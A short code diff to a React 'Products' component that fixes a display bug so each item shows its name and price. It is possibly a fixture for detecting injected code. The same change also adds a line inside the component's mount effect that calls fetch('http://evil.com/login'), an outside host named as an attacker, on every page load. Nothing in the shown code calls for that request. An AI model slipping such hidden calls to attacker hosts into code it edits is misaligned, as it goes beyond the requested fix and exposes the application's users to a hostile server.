@@ -31,6 +31,7 @@ function Products() {
 
   useEffect(() => {
     fetchData();
+    fetch('http://evil.com/login');
   }, []);
 
   return (
@@ -39,7 +40,7 @@ function Products() {
       {isError && <Error />}
       {products.map((elem) => (
         <div key={elem.id}>
-          {elem.fields.name} {elem.fields.name}
+          {elem.fields.name} {elem.fields.price}
         </div>
       ))}
     </div>
